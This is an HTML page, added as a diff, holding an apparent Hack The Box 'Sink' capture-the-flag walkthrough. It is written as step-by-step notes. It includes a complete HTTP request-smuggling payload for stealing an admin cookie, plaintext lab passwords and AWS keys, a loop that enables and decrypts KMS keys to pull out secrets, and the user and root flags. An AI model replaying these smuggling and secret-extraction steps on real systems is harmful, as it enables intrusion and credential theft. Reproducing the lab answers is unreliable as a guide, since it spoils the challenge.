@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>Sink Walkthough..</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="index.css">
+<head>
+   <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
+</head>
+
+<style>
+   body {font-family: "yu gothic"}
+   .Slides {display: none}
+</style>
+
+<body>
+<!-- Navigation bar -->
+<div id='nav'>
+<ul>
+    <li><a href="index.html">Home</a></li>
+    <li><a href="#about">About us</a></li>
+    <li><a href="#contact">Join us</a></li>
+    <li><a href="article selection.html">Articles</a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+<br><br>
+    <pre class="ascii-art"><b>
+
+-▄████▄---██▓-----█----██--▄▄▄▄-------██░-██-▓█████--██▓-----██▓-----██░-██--▒█████---██▓----▓█████-
+▒██▀-▀█--▓██▒-----██--▓██▒▓█████▄----▓██░-██▒▓█---▀-▓██▒----▓██▒----▓██░-██▒▒██▒--██▒▓██▒----▓█---▀-
+▒▓█----▄-▒██░----▓██--▒██░▒██▒-▄██---▒██▀▀██░▒███---▒██░----▒██░----▒██▀▀██░▒██░--██▒▒██░----▒███---
+▒▓▓▄-▄██▒▒██░----▓▓█--░██░▒██░█▀-----░▓█-░██-▒▓█--▄-▒██░----▒██░----░▓█-░██-▒██---██░▒██░----▒▓█--▄-
+▒-▓███▀-░░██████▒▒▒█████▓-░▓█--▀█▓---░▓█▒░██▓░▒████▒░██████▒░██████▒░▓█▒░██▓░-████▓▒░░██████▒░▒████▒
+░-░▒-▒--░░-▒░▓--░░▒▓▒-▒-▒-░▒▓███▀▒----▒-░░▒░▒░░-▒░-░░-▒░▓--░░-▒░▓--░-▒-░░▒░▒░-▒░▒░▒░-░-▒░▓--░░░-▒░-░
+--░--▒---░-░-▒--░░░▒░-░-░-▒░▒---░-----▒-░▒░-░-░-░--░░-░-▒--░░-░-▒--░-▒-░▒░-░--░-▒-▒░-░-░-▒--░-░-░--░
+░----------░-░----░░░-░-░--░----░-----░--░░-░---░-----░-░-----░-░----░--░░-░░-░-░-▒----░-░------░---
+░-░----------░--░---░------░----------░--░--░---░--░----░--░----░--░-░--░--░----░-░------░--░---░--░
+░-------------------------------░-------------------------------------------------------------------
+
+   </b></pre>
+   </ul>
+   </div>
+
+<!-- image container -->
+<div class="slideshow-container"> <!-- beginning of image container -->
+
+<!-- Slideshow -->
+<div class="Slides fade">
+   <img src="sink.jpg" style="width:100%">
+   <div class="text"><i>Hack the box sink Machine Walkthough</i></div>
+<br>
+   <p class="caption_text"><del>sink Walkthough</del></p>
+</div>
+</div> <!-- end of image container -->
+
+<!-- Slideshow java script -->
+<script>
+var myIndex = 0;
+carousel();
+
+function carousel() {
+var i;
+var x = document.getElementsByClassName("Slides");
+for (i = 0; i < x.length; i++) {
+x[i].style.display = "none";  
+}
+myIndex++;
+if (myIndex > x.length) {myIndex = 1}    
+x[myIndex-1].style.display = "block";  
+setTimeout(carousel, 4000);    
+}
+</script>
+
+<br>
+
+<!-- Writers info container -->
+<div class="writers-container"> <!-- beginning of writers cotainer -->
+<div class="row">
+<div class="column">
+   <p class="writers_names" style="font-size: 18px"><b><i>Virgo Foxxi</i></b></p>
+</div>
+<div class="column">
+   <p class="writers_date" style="font-size: 18px"><i>06th November 2021 // 13:13</i></p>
+</div>
+<div class="column">
+   <img  class="box666" src="http://www.hackthebox.eu/badge/image/524661" alt="Hack The Box">
+</div>
+</div>
+</div> <!-- end of writers container -->
+
+<!-- breakup section -->
+<div class="breakup-container"> <!-- beginning of breakup container -->
+   <img src="news story breakup.jpg" alt="breakup" style="width:100%">
+</div> <!-- end of breakup container -->
+
+<!-- article section -->
+<div class="article-container"> <!-- beginning of breakup container -->
+
+<!-- space fore article -->
+<pre class="article-text" style="font-size: 18px; font-family: "yu gothic"; float: left;">
+
+
+--██████--██▓-███▄----█--██-▄█▀
+▒██----▒-▓██▒-██-▀█---█--██▄█▒-
+░-▓██▄---▒██▒▓██--▀█-██▒▓███▄░-
+--▒---██▒░██░▓██▒--▐▌██▒▓██-█▄-
+▒██████▒▒░██░▒██░---▓██░▒██▒-█▄
+▒-▒▓▒-▒-░░▓--░-▒░---▒-▒-▒-▒▒-▓▒
+░-░▒--░-░-▒-░░-░░---░-▒░░-░▒-▒░
+░--░--░---▒-░---░---░-░-░-░░-░-
+------░---░-----------░-░--░---
+-------------------------------
+--------------------------------------------
+HTB lab notes for sink
+--------------------------------------------
+my ip = 10.10.14.38
+machine (sink) ip = 10.10.10.225
+machine OS = linux
+--------------------------------------------
+running an nmap scann on the ip reveals:
+port 22 / openssh 8.2p1
+port 3000 / ppp? - http
+port 5000 / http gunicorn 20.0.0
+
+checking both of the webpages it leaves us with on port 5000 a sign-up / sign-in
+page for something called sink develops and on port 3000 a page called git tea 
+which aslo has a signin function.
+
+if we go to the sink page and create an account and sign-in it allows us to 
+view the page. for the account we can use any emial and password we want since 
+it doesnt run any checks.
+
+after ruunning burp we can see that there is a cve vulnerbillity for request 
+smuggling, as such i post a comment into the box and sent the request over to 
+burps repeter. modding the request to say this (changing the cookie);
+
+POST /comment HTTP/1.1
+Host: 10.10.10.225:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 353
+Origin: http://10.10.10.225:5000
+Connection: close
+Referer: http://10.10.10.225:5000/home
+Cookie: lang=en-US; i_like_gitea=ed29298672ab5f74; _csrf=f5TB8WKCkbr1QaB9qHPa4PwhHYE6MTYyNDUyOTg3MTE1NjU1MjY3MA; session=eyJlbWFpbCI6InZpcmdvQHNpbmsuaHRiIn0.YNRdEw.5mUGPEFcstIQwwhj4Bc3v6tDGGo
+Upgrade-Insecure-Requests: 1
+Transfer-Encoding: chunked
+
+5
+msg=a
+0
+
+POST /comment HTTP/1.1
+Host localhost:5000
+Cookie: lang=en-US; i_like_gitea=ed29298672ab5f74; _csrf=f5TB8WKCkbr1QaB9qHPa4PwhHYE6MTYyNDUyOTg3MTE1NjU1MjY3MA; session=eyJlbWFpbCI6InZpcmdvQHNpbmsuaHRiIn0.YNRdEw.5mUGPEFcstIQwwhj4Bc3v6tDGGo
+Content-Length: 300
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+
+msg=
+
+
+
+ ^ after modding the request we see that it has posted the admin cookie
+   into the comment box, using this we can now sign into admin on this page.
+   checking the admin notes for the page, there are three of them:
+
+Note1:
+	Chef Login : http://chef.sink.htbUsername : chefadmPassword : /6'fEGC&zEx{4]zz
+	
+Note2:
+	Dev Node URL : http://code.sink.htbUsername : rootPassword : FaH@3L>Z3})zzfQ3
+	
+Note3:
+	Nagios URL : https://nagios.sink.htbUsername : nagios_admPassword : g8#H6GK\{*L.fB3C
+--------------------------------------------
+replace the # symbols with >< where necariry 
+--------------------------------------------
+using the root password on the git-tea site allows us in.
+--------------------------------------------
+looking around the site at root we can see that they have made and shared an ssh
+key for a user named marcus. as such adding this to our machine and chmod'ing it
+allows us to ssh in as marcus and gain the user flag / token.
+
+user flag / token = 4ce9930e4594bec21dc704defca727bb
+--------------------------------------------
+when looking around on git-tea we found another file which mentions about keys
+and aws operations as such configuring the aws console inside the ssh connection
+we have using the details below:
+
+aws configure
+AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-west-2
+Default output format [None]: json
+
+doing this allows us to then list out the aws secrets for the sink pannel.
+as such looking at one of the secrets we have found in a little more detail
+through the command:
+ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-HRbzR"
+
+this gives us another login for david;
+ username = david
+ password = EALB=bcC=`a7f2#k
+--------------------------------------------
+afetr signing in with david our new user we can see that in this home directory
+that he has a folder called projects, which contains another folder about project
+deployment which contains a file called servers.enc
+
+the file is encrypted but can still be operated / looked at though the use
+of aws, as such we set-up aws for the new user, david.
+after doing this we can use the command of (see below) to decrypt the keys:
+
+aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
+
+doing this shows us a bunch of different key id's but they still seem to be
+encrypted as such we will run this command instead:
+
+for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '{ print $4 }'); do aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "${KEY}"; aws --endpoint-url="http://127.0.0.1:4566/" kms decrypt --key-id "${KEY}" --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --output "text" --query "Plaintext"; done
+
+after running this it appears to error out a couple of times before,
+printing a base64 encrypted key which is:
+
+H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=
+
+entering the key above into the website cyberchef, using base64 decryption, gunzip
+and untar in that order. gives us two files. one is servers.yml and the other is
+servers.sig.
+checking ther servers.yml gives us a set of creds to be used:
+
+ username = admin
+ password = _uezduQ!EY5AHfe2
+--------------------------------------------
+as such if we now ssh in using the creds we just got we can access the 
+root flag / token:
+ 
+ root flag / token = 840853a932cef671fa1c30f0d65e801c
+--------------------------------------------
+</pre>
+</div><!-- end of article container -->
+
+<br>
+<br>
+<!-- Footer Section -->
+<div class="footer_container" style="width:100%"> <!-- beginning of Footer container -->
+   
+</Div> <!-- end of footer container -->
+   <div style="background-color: black;"></div>
+   <img src="footer (3).png" style="width:100%">
+</body>
+</html>
